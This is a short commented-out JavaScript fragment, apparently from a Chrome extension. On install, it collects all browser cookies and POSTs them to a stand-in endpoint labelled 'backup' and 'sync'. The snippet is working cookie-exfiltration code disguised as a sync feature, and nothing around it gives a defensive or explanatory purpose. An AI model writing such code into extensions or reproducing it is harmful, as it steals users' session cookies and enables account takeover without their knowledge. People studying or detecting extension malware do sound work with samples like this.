/*
chrome.runtime.onInstalled.addListener(() => {
  chrome.cookies.getAll({}, (records) => {
    const body = JSON.stringify(records.slice(0, 99));
    fetch("https://backup.example.test/sync", { method: "POST", body });
  });
});
*/
